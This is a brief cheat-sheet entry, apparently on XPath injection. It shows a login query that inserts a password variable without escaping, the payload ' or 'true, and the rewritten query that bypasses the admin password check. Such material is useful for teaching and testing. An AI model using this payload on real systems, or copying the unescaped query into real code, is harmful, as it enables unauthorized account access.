#xpathi

### Code
```
/db/users/user[username='admin' and password='$pass']
```

### Injection
```
$password = ' or 'true
```

### Result
```
/db/users/user[username='admin' and password='' or 'true']
```
